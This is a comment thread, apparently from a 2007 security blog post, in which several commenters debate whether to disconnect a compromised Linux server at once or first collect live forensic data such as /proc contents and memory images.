<p>In your scenario, if indeed the compromised box is the <em>only</em> box that your supersecret data on it, maybe your argument has merit. Otherwise, the moment you pull that plug, the race is on between your identifying and containing every other compromised host and the intruder&#8217;s stealing every other secret he has access to but hasn&#8217;t had time to collect yet. Once you start that race, the intruder has an incentive to steal as much as he can in the shortest possible time. Before the race, however, he&#8217;ll work at his own pace while trying to stay under the radar, and it&#8217;s to your advantage to keep him in that mode if there&#8217;s any possibility he&#8217;s into other boxes you don&#8217;t know about.</p>
<p>Knowing this, a reasonable person will start the race at a time of his choosing, <em>after</em> assessing the situation, not before. The trick is to start and end the race at the same moment, which you can do only if you know the full extent of the compromise. Doing this properly involves setting up systems to cover critical services on compromised hosts ahead of time, then taking all of the compromised and vulnerable hosts (you have to know the vulnerability to know which these are) offline at the same moment, pointing the remaining boxes at the new critical service systems, patching the vulnerable systems that weren&#8217;t compromised, and quarantining the compromised ones for recovery, usually involving a complete reinstall. Note how dramatically different this is from pulling the network cable on one box.</p>
<p>xrey&gt; Networks go down all the time, so a cracker isn&#8217;t going to start reprisals just because he can&#8217;t get to your box temporarily.</p>
<p>The sort of intruder who will toast your system can also tell the difference between your network dropping for ten minutes at 0200 for an IOS upgrade, and the single box that he saw root log into five minutes ago suddenly becoming unreachable. But really, threat of reprisal (and it&#8217;s not even reprisal&#8211;it&#8217;s ass-covering) is only one of many reasons to forgo the knee-jerk route (or unroute, ha ha), and instead invest some time and energy toward understanding the situation before reacting. Knowledge enables you to take an advantageous, offensive position before the combat starts, rather than end up in a defensive position because you attacked blindly without learning your enemy&#8217;s position first.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67518">

			<div class="comment by-xrey ">

				<p class="commentcredit">

					<span class="commenter">xrey</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67518">
						August 16, 2007 9:28 PM					</a>

				</p>

				<p>@antibozo:</p>
<p>Actually, if there are more boxes with supersecret data, then you have to pull those too. Depending on the size of your institution, that may involve pulling a lot of network cables. It sucks, but I&#8217;ve been there.</p>
<p>You have to do it simultaneously and immediately. You need to prevent the cracker from entering any of your boxes with backdoors that he&#8217;s had months building.</p>
<p>If your institution can&#8217;t pull everything, then at the very least, you should pull all the machines listed in /etc/hosts and any machine with of the same user accounts listed in /etc/users. You have to assume that the cracker has used the compromised box to learn more about the interior of your network, and you have to assume that the cracker may have intercepted user accounts and passwords including root passwords.</p>
<p>Depending on how much time your institution wants to spend doing forensics, at the bare minimum, you must change all root and user passwords for all the boxes after they have been scanned for compromise.</p>
<p>Well, I won&#8217;t tell you, personally, what to do, antibozo. You can play amateur detective with your own boxes all you want. However, if you are administering someone else&#8217;s machines, good luck explaining why you left compromised machines vulnerable for &#8220;another few hours,&#8221; during which time the cracker could do anything he wanted.</p>
<p>The cracker might be a script kiddie or it might be a h4xxor g0d, so it&#8217;s better to not give him a chance to act. Physically removing the machine(s) from the network is the only way to be sure.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67519">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67519">
						August 16, 2007 9:58 PM					</a>

				</p>

				<p>xrey&gt; Actually, if there are more boxes with supersecret data, then you have to pull those too. Depending on the size of your institution, that may involve pulling a lot of network cables. It sucks, but I&#8217;ve been there.</p>
<p>I see. So you don&#8217;t work at an organization that has requirements about downtime tolerance. I suppose you&#8217;d take all the potentially compromised systems off the network immediately if they were, say, controlling a city-wide electric power grid?</p>
<p>xrey&gt; Well, I won&#8217;t tell you, personally, what to do, antibozo. You can play amateur detective with your own boxes all you want. However, if you are administering someone else&#8217;s machines, good luck explaining why you left compromised machines vulnerable for &#8220;another few hours,&#8221; during which time the cracker could do anything he wanted.</p>
<p>I&#8217;ll ignore the tone of that comment insofar as to note that I don&#8217;t have any difficulty explaining the logic of my procedures to my clients, and to inform you that nothing I am saying is particularly iconoclastic. I think you&#8217;ll find, if you look above the &#8220;amateur detective&#8221; class, that there are people who understand that this field is far more complex that can be handled with an always-pull-the-network-cable approach. As I&#8217;ve intimated, there are cases where that&#8217;s appropriate, and there are cases where it isn&#8217;t. Yes, most Windows virus infections may be in the former class. Most Linux compromises are not.</p>
<p>xrey&gt; Physically removing the machine(s) from the network is the only way to be sure.</p>
<p>Sure of what? In cases where someone left a logic bomb, physically removing the machine from the network may trigger a system wipe. Meanwhile, if I lose my chance to find out what IPs the attacker was last working from by pulling the network too early, I&#8217;m throwing away valuable information I could use to identify other compromised hosts by inspecting firewall logs.</p>
<p>Nothing is certain, but knowledge tends to triumph over ignorance. Procedures that emphasize knowledge gathering facilitate intelligent incident response. One-rule-fits-all, knowledge-free strategies may work in a lot of cases, but when they fail, they fail spectacularly. In some organizations, this results in people dying, so some of us are willing to do some extra work to avoid that.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67520">

			<div class="comment by-brandioch-conner ">

				<p class="commentcredit">

					<span class="commenter">Brandioch Conner</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67520">
						August 16, 2007 10:57 PM					</a>

				</p>

				<p>@antibozo<br />
&#8220;If you&#8217;re talking about how skillfully the intruder can deduce that I know about him, yes, that is difficult to gauge a priori, but after doing the basic stuff unobtrusively one can form some judgments based on the types of tools one finds.&#8221;</p>
<p>&#8230;and then&#8230;</p>
<p>&#8220;Sure of what? In cases where someone left a logic bomb, physically removing the machine from the network may trigger a system wipe.&#8221;</p>
<p>Yep, you&#8217;re arguing against anything other than your position by assuming that the cracker has taken specific steps to maximize the damage in anything you disagree with &#8230;</p>
<p>&#8230; while simultaneously claiming that the cracker would NOT have done anything similar in the scenario you are advocating.</p>
<p>Meanwhile, in the real world and in the real world &#8230;</p>
<p>&#8220;And of course you wouldn&#8217;t hear any such stories, because when a gang of systems goes south all of a sudden in the normal course of business, people don&#8217;t usually assume it&#8217;s because of a mass compromise.&#8221;</p>
<p>Actually, you would. Individual machines can fail&#8230;</p>
<p>A bad update can be applied to a bunch of machines&#8230;</p>
<p>A bad machine can flood the network making it appear that a bunch of machines are down&#8230;</p>
<p>But having a bunch of machines suddenly wipe themselves? That would be a story and a half.</p>
<p>You might want to familiarize yourself with Bruce&#8217;s &#8220;movie plot threat&#8221; concept. It&#8217;s what you&#8217;re practicing right now.</p>
<p>Meanwhile, the advice to follow best practices still stands. Disconnect the machine. Image it or whatever later, but disconnect it first. The best admins will not concern themselves with &#8220;movie plot threats&#8221;. They&#8217;ll follow best practices instead.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67521">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67521">
						August 16, 2007 11:41 PM					</a>

				</p>

				<p>Brandioch Conner&gt; you&#8217;re arguing against anything other than your position by assuming that the cracker has taken specific steps to maximize the damage in anything you disagree with</p>
<p>Actually, I&#8217;m arguing against assuming anything specific about what the intruder has done, and arguing for observation before action. But you&#8217;d have to read what I wrote to understand that, and note that it was a response to an absolute statement (&#8220;it&#8217;s the only way to be sure&#8221;) that is demonstrably false.</p>
<p>I&#8217;m also arguing against panic-driven autonomic response, by the way. Again, what horrible thing do you think happens between time [compromise + x] and [compromise + x + y], where x is unknown and y is time to gather knowledge of the situation, that necessarily outweighs the value of the knowledge gained during y for orchestrating an instantaneous containment? Why do you think it always correct to pull one box off the network before you&#8217;ve even figured out how it was compromised, when a hundred other boxes may have the same vulnerability?</p>
<p>Brandioch Conner&gt; But having a bunch of machines suddenly wipe themselves? That would be a story and a half.</p>
<p>It would, if the sysadmins who observed it had the skill to even think of it. Most sysadmins need to be specifically trained to consider compromise as a possible cause of bad system behavior. Their natural tendency is to assume an environmental (&#8220;power surge&#8221;) or common software cause (&#8220;NFS problems&#8221;), because that&#8217;s the usual case (as far as they know). I&#8217;m not talking about the Brandioch Conners of the world, here; I&#8217;m talking about the other 98%. Yes, for them, the best advice might be to pull the network cable, leave the facility, and go get a new job as a crane operator.</p>
<p>Brandioch Conner&gt; You might want to familiarize yourself with Bruce&#8217;s &#8220;movie plot threat&#8221; concept.</p>
<p>If you want to drag Bruce into it, you might want to familiarize yourself with his &#8220;focus on intelligence gathering, and don&#8217;t defend blindly against specific tactics because the attackers will adapt&#8221; advice.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67522">

			<div class="comment by-pat-cahalan ">

				<p class="commentcredit">

					<span class="commenter"><a href='http://padraic2112.wordpress.com' rel='external nofollow ugc' class='url'>Pat Cahalan</a></span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67522">
						August 17, 2007 12:27 AM					</a>

				</p>

				<p>@ Brandioch, Antibozo, xrey</p>
<p>re: first response</p>
<p>I think you&#8217;re arguing way past base cases, my friends.</p>
<p>If someone cracks into my personal *NIX box, I&#8217;m going to unplug the thing from the network and the wall.  Then I&#8217;m going to yank the hard drive out of the machine, plug it into another box, fsck it and examine it if and when I decide I feel like a good murder mystery.  You can leave it up if you like, but I don&#8217;t believe overmuch in performing forensics on a live machine, since you already don&#8217;t know what it&#8217;s doing.  You may learn something interesting, you may not, but whatever it is doing it&#8217;s going to keep doing while you&#8217;re digging around in its guts.</p>
<p>If you&#8217;re dealing with a mission critical box or something that has proprietary, secret, or private data on it, you should already know what the hell you&#8217;re supposed to do (and you should have already communicated that to any stakeholders that may be affected by downtime).  In most cases, I think a reasonable security plan would say, &#8220;Kill the box immediately, and anything it has been talking to&#8221;.</p>
<blockquote><p>
  I suppose you&#8217;d take all the potentially compromised systems<br />
  off the network immediately if they were, say, controlling a city-wide<br />
  electric power grid?
</p></blockquote>
<p>If I don&#8217;t have an emergency response plan that considers that I may have to forcibly shut down a major control center  (or have it shut down for me), for whatever the root cause, and I&#8217;m responsible for something as important as a city power grid, I&#8217;m going to quietly go work on my resume.  If I had a plan but it was rejected, I&#8217;m digging up the documentation of who rejected it and why, printing it out, and making sure that leaves with me in case I can&#8217;t get back in the building later.</p>
<blockquote><p>
  Meanwhile, if I lose my chance to find out what IPs the attacker was<br />
  last working from by pulling the network too early, I&#8217;m throwing<br />
  away valuable information I could use to identify other compromised<br />
  hosts by inspecting firewall logs.
</p></blockquote>
<p>I&#8217;ll have to disagree with you here on this one, AB.  Someone who&#8217;s going to build a self destruct is probably going to do a good enough job of covering his/her tracks that you&#8217;re not going to get much out of the machine, forensically speaking.  Since the box is untrusted, you can&#8217;t rely on the logs anyway (most rootkits I&#8217;ve seen turn off logging as the first matter of course anyway).  If you don&#8217;t have some method of analyzing the network traffic outside the host itself, like router logs, it&#8217;s probably better to shut the beast down.</p>
<p>And, if they&#8217;re not good enough to wipe tracks properly, you&#8217;ll get plenty of dirt off of examining the contents of the drive and the swap file while doing your examination using a known trusted OS platform.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67523">

			<div class="comment by-chris-rutherford ">

				<p class="commentcredit">

					<span class="commenter"><a href='http://www.hackinghardware.com/' rel='external nofollow ugc' class='url'>Chris Rutherford</a></span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67523">
						August 17, 2007 2:42 AM					</a>

				</p>

				<p>Bruce, what has happened to you?  First you join up with BT and then you start using derogatory words like &#8216;Techie&#8217; to describe intelligent people.  As far as i&#8217;m concerned the article you commented in isn&#8217;t in the slightest bit &#8216;Techie&#8217;.</p>
<p><a href="http://en.wikipedia.org/wiki/Techie" rel="nofollow ugc">http://en.wikipedia.org/wiki/Techie</a></p>
<p>Chris</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67524">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67524">
						August 17, 2007 3:53 AM					</a>

				</p>

				<p>Pat Calahan&gt; If someone cracks into my personal *NIX box, I&#8217;m going to unplug the thing from the network and the wall. Then I&#8217;m going to yank the hard drive out of the machine, plug it into another box, fsck it and examine it if and when I decide I feel like a good murder mystery.</p>
<p>I&#8217;m reluctant to go into specific tactics for a specific yet vaguely defined scenario for a number of reasons, but here are a few thoughts about that course of action:</p>
<ol>
<li>I assume you don&#8217;t perform any remote admin work for clients from your personal *NIX box, because all your remote credentials may have been compromised in this scenario. Without finding out, minimally, how long ago it happened, you won&#8217;t even have an approximate timeline to examine for all of your remote activity on such remote hosts, nor will you have any clues about which credentials to treat with priority. It&#8217;s a good thing you don&#8217;t do that remote admin work, because you&#8217;d be doing a tremendous disservice to yourself and your clients by not doing due diligence to identify any compromise of their systems resulting from the compromise of yours.</li>
<li>You just threw away oodles of information from the /proc filesystem, cores of the intruder&#8217;s processes, in-core log information, and kernel data structures that would help you determine the scope of the situation you&#8217;re dealing with. At the very least, saving a copy of everything in /proc onto a USB stick, along with, if possible, an image of /dev/{,k}mem is de rigeur.</li>
<li>fsck modifies the filesystem. You&#8217;ll get more info if you can avoid using it. You don&#8217;t need to mount ext3 or Sun ufs filesystems; there are programs such as debugfs and fsdb that allow you to inspect these without mounting, which is safer for your analysis system anyway.</li>
</ol>
<p>Pat Calahan&gt; You can leave it up if you like, but I don&#8217;t believe overmuch in performing forensics on a live machine, since you already don&#8217;t know what it&#8217;s doing.</p>
<p>Well, I wouldn&#8217;t leave it up indefinitely, but I&#8217;d certainly take the time to identify everything I reasonably could about live network connections before yanking any network cables. And I wouldn&#8217;t crash it until I got everything useful I could out of the live system, and believe me, that&#8217;s actually quite a lot, because rootkits generally suck.</p>
<p>Pat Calahan&gt; In most cases, I think a reasonable security plan would say, &#8220;Kill the box immediately, and anything it has been talking to&#8221;.</p>
<p>In most cases, it depends on the box, the function, and the type of compromise. Take a look at the NIST incident response documents (e.g. 800-61, 800-86) for some idea of the range of possibilities here. In most scenarios, a partial network containment would be initiated early on, but there are always exceptional circumstances, and every incident is unique.</p>
<p>Pat Calahan&gt; If I don&#8217;t have an emergency response plan that considers that I may have to forcibly shut down a major control center (or have it shut down for me), for whatever the root cause, and I&#8217;m responsible for something as important as a city power grid, I&#8217;m going to quietly go work on my resume.</p>
<p>I think you erroneously assume here that the incident response team, or any computer security professional for that matter, ever had any input into the emergency response plan for the compromised system. Incident response teams are like firefighters; they&#8217;re called in when there&#8217;s a fire. They aren&#8217;t consulted when the facility was built or the fire detection and suppression system was installed; they&#8217;re just expected to deal with the fire when it happens, and in many cases the people who built the facility didn&#8217;t follow the fire code, if you will. Few organizations have an inspection regimen for software and systems that parallels the physical inspection that covers facilities, so it&#8217;s way worse for response teams than for firefighters. On the plus side, incident responders have much safer jobs&#8230; ;^)</p>
<p>antibozo&gt; Meanwhile, if I lose my chance to find out what IPs the attacker was last working from by pulling the network too early, I&#8217;m throwing away valuable information I could use to identify other compromised hosts by inspecting firewall logs.<br />
Pat Calahan&gt; Someone who&#8217;s going to build a self destruct is probably going to do a good enough job of covering his/her tracks that you&#8217;re not going to get much out of the machine, forensically speaking.</p>
<p>I mean that once you pull the network cable you have limited time to collect the network information in <em>all</em> cases, not just those where a logic bomb is involved. Sorry that wasn&#8217;t clear.</p>
<p>And, as observed elsewhere, by pulling the cable you start the game clock, so you&#8217;d better be ready to play.</p>
<p>Pat Calahan&gt; Since the box is untrusted, you can&#8217;t rely on the logs anyway</p>
<p>That doesn&#8217;t mean you ignore them.</p>
<p>Pat Calahan&gt; (most rootkits I&#8217;ve seen turn off logging as the first matter of course anyway).</p>
<p>You&#8217;d be amazed at how often people screw up this simple step.</p>
<p>In practice, there aren&#8217;t any good rootkits. Suckit was fairly innovative at the time, but it has major flaws and it is actually extremely easy for a competent incident responder to detect and build a network scanner for. Yes, the sysadmin may be fooled by it. That&#8217;s why step 1 for the sysadmin is not &#8220;pull the network cable&#8221;; it&#8217;s &#8220;call the incident response team&#8221;. After all, a lot of times, the box that&#8217;s acting funny isn&#8217;t compromised at all.</p>
<p>Pat Calahan&gt; And, if they&#8217;re not good enough to wipe tracks properly, you&#8217;ll get plenty of dirt off of examining the contents of the drive and the swap file while doing your examination using a known trusted OS platform.</p>
<p>I&#8217;m afraid you are vastly understating the volume of information that is lost when a system is crashed. Just consider what the core image of an intruder&#8217;s shell can be worth. Don&#8217;t count on your being able to reconstruct anything useful out of the page-sized confetti fragments strewn all over the swap device. And a lot of systems have enough core these days that they never even touch swap.</p>
<p>New systems are an issue with disk imaging as well. How many 300GB system disk images do you feel like scanning through and trying to keep in online storage? And now that sysadmins don&#8217;t know how to partition disks any more (&#8220;oh, I just made one giant root partition&#8221;) you have almost no help from the disk layout in narrowing your search. Believe me, you&#8217;re going to find out a lot more a helluva lot faster looking at the live system than you are trying to scrape through a massive disk, after you&#8217;ve pulled it and found another box to plug it into. Sorry, but the notion of crashing a box without a preliminary exam in anything other than the most extreme case is totally insane.</p>
<p>Nice chatting with you, Pat. :^)</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67525">

			<div class="comment by-kristine ">

				<p class="commentcredit">

					<span class="commenter">Kristine</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67525">
						August 17, 2007 4:47 AM					</a>

				</p>

				<p>Time to re-read my Zombie Survival Guide. Especially the section on penguin zombies.</p>
<p>Kristine</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67526">

			<div class="comment by-colossal-squid ">

				<p class="commentcredit">

					<span class="commenter">Colossal Squid</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67526">
						August 17, 2007 5:42 AM					</a>

				</p>

				<p>Interesting discussion, could anyone point me towards best practice resources for an amateur administering a Linux home server?</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67527">

			<div class="comment by-brandioch-conner ">

				<p class="commentcredit">

					<span class="commenter">Brandioch Conner</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67527">
						August 17, 2007 9:03 AM					</a>

				</p>

				<p>@antibozo<br />
&#8220;If you want to drag Bruce into it, you might want to familiarize yourself with his &#8220;focus on intelligence gathering, and don&#8217;t defend blindly against specific tactics because the attackers will adapt&#8221; advice.&#8221;</p>
<p>And that contradicts what I said &#8230; how? Please be specific.</p>
<p>Remember, the attack has already occurred and been successful. Bruce seems to advocate &#8220;intelligence gathering&#8221; prior to the attack as a means of preventing the attack.</p>
<p>You do know that &#8220;prior&#8221; and &#8220;after&#8221; are different, don&#8217;t you?</p>
<p>&#8220;It would, if the sysadmins who observed it had the skill to even think of it.&#8221;</p>
<p>Ah, so now the scenarios you describe also depend upon admins who are so incompetent that they don&#8217;t suspect anything when 10 of their machines suddenly wipe themselves.</p>
<p>Congratulations, you&#8217;ve just moved from &#8220;movie plot threat&#8221; to &#8220;BAD movie plot threat&#8221;. You know, the ones that violate various laws of physics or that depend upon what I like to call &#8220;Hollywood Coincidences&#8221; to succeed.</p>
<p>Yeah, that&#8217;s the reason why your scenario has never been reported &#8220;in the wild&#8221;. The times it happens, the admin running those machines thinks it&#8217;s perfectly normal for multiple machines to simultaneously wipe themselves.</p>
<p>And that admin does NOT read any tech publications nor does he have ANY tech friends whom he would talk to that would tell him any differently.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67528">

			<div class="comment by-pat-cahalan ">

				<p class="commentcredit">

					<span class="commenter"><a href='http://padraic2112.wordpress.com' rel='external nofollow ugc' class='url'>Pat Cahalan</a></span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67528">
						August 17, 2007 9:41 AM					</a>

				</p>

				<blockquote>
<ol>
<li>I assume you don&#8217;t perform any remote admin work for clients from your<br />
  personal *NIX box, because all your remote credentials may have been compromised<br />
  in this scenario.</li>
</ol>
</blockquote>
<p>You&#8217;re right, I don&#8217;t ðŸ™‚  I don&#8217;t do any adminning from any box that runs services.</p>
<blockquote>
<ol>
<li>You just threw away oodles of information from the /proc filesystem, cores of the<br />
  intruder&#8217;s processes, in-core log information, and kernel data structures that would<br />
  help you determine the scope of the situation you&#8217;re dealing with.</li>
</ol>
</blockquote>
<p>Yes, you&#8217;re correct.  Saving the machine state information is useful.</p>
<blockquote><p>
  Well, I wouldn&#8217;t leave it up indefinitely, but I&#8217;d certainly take the time to identify<br />
  everything I reasonably could about live network connections before<br />
  yanking any network cables.
</p></blockquote>
<p>Sorry, I just re-read my post and I realize what I was trying to say was &#8220;each incident&#8217;s response should be context dependent&#8221;, but then I went and discussed my response without providing full context, so on the whole I get credit for a bad post ðŸ™‚</p>
<p>If a machine is compromised, saying &#8220;you should always do this [list]&#8221; vs &#8220;you should always do this other [list]&#8221; isn&#8217;t the argument you should be having.</p>
<p>The argument should be, &#8220;Given a system which provides service [foo], how do I plan to respond given [hack, fire, power outage, etc], who needs to know what pieces of information, etc.&#8221;  If you&#8217;re responding to a security incident using your own [security and/or sysadmin] template without knowing what the consequences are to your organization, your template may be very useful in doing forensics, but might be totally inappropriate for your customer.</p>
<blockquote><p>
  In most cases, it depends on the box, the function, and the type of compromise.
</p></blockquote>
<p>That was my intended point.  You&#8217;re arguing a predominantly forensic standpoint, Brandioch is arguing a predominantly preventative standpoint, but you both have good ideas that may be more appropriate given the context.</p>
<blockquote><p>
  You&#8217;d be amazed at how often people screw up this simple step.
</p></blockquote>
<p>Not really, we&#8217;ve had to deal with a couple of intrusions and this step is often broken, that&#8217;s true.  Using a log host helps a lot even when logging is the first thing they disable, since they can&#8217;t affect the existing logs if you can read them elsewhere ðŸ™‚</p>
<blockquote><p>
  I&#8217;m afraid you are vastly understating the volume of information that is lost<br />
  when a system is crashed.
</p></blockquote>
<p>Yes and no.  From a forensic standpoint, you can learn a lot.  You can learn a great many things about the intruder, certainly.  You can learn specifically what tools were used to break into your machine, sure.  You can find out whose account was hacked, where the compromise may have occurred, what other machines the host was talking to, etc.</p>
<p>However, forensics may not be an issue.  Aside from &#8220;being a good citizen&#8221;, you may not care where the attack came from, or what other machines were attacked by the box.  You may have the router logs, and already know what traffic has been coming from the box.  You may know that the box was running a web service with a PHP backend and already have a pretty good idea how the box was hacked, even if you don&#8217;t know the specific details.  You may be in a race for time to prevent the box from attacking other things inside your DMZ, if the box has access to your management net.  We can go on and on, but &#8220;shutting the box off&#8221; (and losing forensics data) may be vastly more appropriate than &#8220;leaving the box on&#8221; (and allowing the machine to run in a nasty state until you can figure out what&#8217;s going on).</p>
<p>My point (albeit not well articulated in the last post) is that arguing about tactics before acknowledging the strategic situation is&#8230; well, not the right place to start.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67529">

			<div class="comment by-paul-glover ">

				<p class="commentcredit">

					<span class="commenter"><a href='http://paulglover.net/' rel='external nofollow ugc' class='url'>Paul Glover</a></span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67529">
						August 17, 2007 10:16 AM					</a>

				</p>

				<p>@merkelcellcancer: there&#8217;s a significant difference between &#8220;somewhat safe&#8221; and &#8220;invulnerable&#8221;. I trust my Linux boxen and the Mac infinitely more than any Windows box I&#8217;m unfortunate enough to have to use, but I also know they&#8217;re only &#8220;somewhat safe&#8221; and I&#8217;d be crazy to assume I could never have a security breach.</p>
<p>There&#8217;s some really useful advice here in the comments. My gut reaction to a discovered compromise would have been &#8220;yank the power, image the drive and examine what was on it&#8221;. Which, as antibozo points out, would mean I threw away everything in /proc, plus the raw memory image, both of which would be invaluable to have around during the subsequent forensics work.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67530">

			<div class="comment by-todd-knarr ">

				<p class="commentcredit">

					<span class="commenter">Todd Knarr</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67530">
						August 17, 2007 10:43 AM					</a>

				</p>

				<p>xrey: your sysadmin may be being smart by not disconnecting the box on the spot. Think about this: you know at least one box is compromised, but how do you know that only one box is compromised? There&#8217;s two conflicting priorities when you&#8217;ve got a compromise on your hands. One is containing the damage and limiting the attacker&#8217;s ability to go any further. The other is figuring out what he&#8217;s done, how he did it and what else he&#8217;s doing. One of the more reliable ways of doing that&#8217;s to watch what the attacker&#8217;s doing (now that you know he&#8217;s there). If he&#8217;s compromised other machines on your network taking the machine you know about down suddenly may make him lie low until he sees if he&#8217;s been detected, where if everything appears normal he may continue accessing machines unaware that you&#8217;re actively looking for his traffic.</p>
<p>What to do depends on the balance between those two priorities, and how confident your sysadmin is that he can monitor the intruder without being noticed himself.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment odd alt thread-odd thread-alt depth-1" id="comment-67531">

			<div class="comment by-antibozo ">

				<p class="commentcredit">

					<span class="commenter">antibozo</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67531">
						August 17, 2007 11:38 AM					</a>

				</p>

				<p>Brandioch, your vitriolic tone has become tiresome, so I&#8217;ll keep it short here:</p>
<p>&#8220;Before the attack&#8221; is not a well-defined event in your analogy. Knowledge that a box has been compromised is not analogous to a plane hitting the World Trade Center; it&#8217;s analogous to finding out some individual is a member of a terrorist cell. How you respond to that knowledge depends on a lot of things, and you don&#8217;t necessarily go out and arrest the one individual you know about the instant you find out.</p>
<p>As to your undying faith in the skill of sysadmins, I&#8217;m not in a position to talk about specific things I&#8217;ve witnessed handling incidents. But I will repeat something I said earlier which perhaps you didn&#8217;t read carefully:</p>
<p>antibozo&gt; I can tell you that such scenarios occur, though I don&#8217;t know of one with the level of caprice in your example.</p>
<p>Whether exactly that event has been reported is irrelevant. What I&#8217;m trying to do is to get you to think beyond the autonomic response, and toward developing an understanding of a compromise before you walk in and start making things worse for someone. You&#8217;ll probably be okay because you sound like a reasonably intelligent, if needlessly snide, person, and I suspect your extreme position is more posturing than how you&#8217;d actually behave when faced with a real compromise. But it&#8217;s too bad you&#8217;re not willing to engage in a reasonable discussion about it.</p>

				
			</div>

		</article>

		</li><!-- #comment-## -->

		<article class="comment even thread-even depth-1" id="comment-67532">

			<div class="comment by-brandioch-conner ">

				<p class="commentcredit">

					<span class="commenter">Brandioch Conner</span> â€¢

					<a href="https://www.schneier.com/blog/archives/2007/08/how_a_linux_ser.html/#comment-67532">
						August 17, 2007 12:13 PM					</a>

				</p>

				<p>@antibozo</p>
<p>&#8220;&#8221;Before the attack&#8221; is not a well-defined event in your analogy.&#8221;</p>
<p>What part do you have trouble with?</p>
<p>Before?<br />
or<br />
Attack?</p>
<p>I&#8217;ll give you a pass on &#8220;the&#8221;.</p>
<p>&#8220;Knowledge that a box has been compromised is not analogous to a plane hitting the World Trade Center; it&#8217;s analogous to finding out some individual is a member of a terrorist cell.&#8221;</p>
<p>Only in your mind. And since you&#8217;ve already lost, you&#8217;d rather argue by analogy. I&#8217;m not going to fall for that.</p>
<p>The box was cracked. The attack had succeeded. And you&#8217;ve even postulated that MULTIPLE attacks have succeeded and that MULTIPLE boxes are cracked.</p>
<p>And then you lapse into your bad &#8220;movie plot threat&#8221; scenario.</p>
<p>But let&#8217;s see what else I can get out of you &#8230;</p>
<p>&#8220;As to your undying faith in the skill of sysadmins, I&#8217;m not in a position to talk about specific things I&#8217;ve witnessed handling incidents.&#8221;</p>
<p>Awesome. You&#8217;ve gone from bad &#8220;movie plot threats&#8221; to &#8220;I have secret knowledge that proves I&#8217;m right but I can&#8217;t tell you because it&#8217;s a secret&#8221;.</p>
<p>ðŸ™‚</p>
<p>Yeah. And your &#8220;secret&#8221; encryption algorithm &#8220;proves&#8221;  you&#8217;re right but it cannot ever be released. How many times have we heard that.</p>
<p>Can you do better?</p>
<p>&#8220;What I&#8217;m trying to do is to get you to think beyond the autonomic response, and toward developing an understanding of a compromise before you walk in and start making things worse for someone.&#8221;</p>
<p>Awww. Now you&#8217;re back to your bad &#8220;movie plot threat&#8221; again.</p>
<p>I&#8217;ve already addressed that. You can make up any scenario you want to. You&#8217;ve already brought up &#8220;logic bombs&#8221; in case the machine is disconnected from the Internet. Yet you always insist that the cracker will NOT do anything that would invalidate your position. That is &#8220;movie plot threat&#8221; in a nutshell.</p>
<p>&#8220;You&#8217;ll probably be okay because you sound like a reasonably intelligent, if needlessly snide, person, and I suspect your extreme position is more posturing than how you&#8217;d actually behave when faced with a real compromise.&#8221;</p>
<p>It&#8217;s not &#8220;snide&#8221;, it&#8217;s &#8220;cynical&#8221;.<br />
I think you&#8217;re a troll. And I&#8217;m having fun mocking the troll.<br />
Yes, my &#8220;extreme position&#8221; of &#8230; disconnecting the box as soon as you find out that it was cracked.</p>
<p>Let me guess. Now you&#8217;ll try to contort a scenario where &#8230;</p>
<p>A. Every box in a life-or-death situation is cracked.</p>
<p>B. A single box is cracked in a life-or-death situaiton &#8230; and that single box is a single point of failure.</p>
<p>Yeah, the designers of those systems must have attended the same schools that the admins did. You know, the ones you claim would not suspect anything odd about 10 machines suddenly wiping themselves.</p>
<p>ðŸ™‚</p>
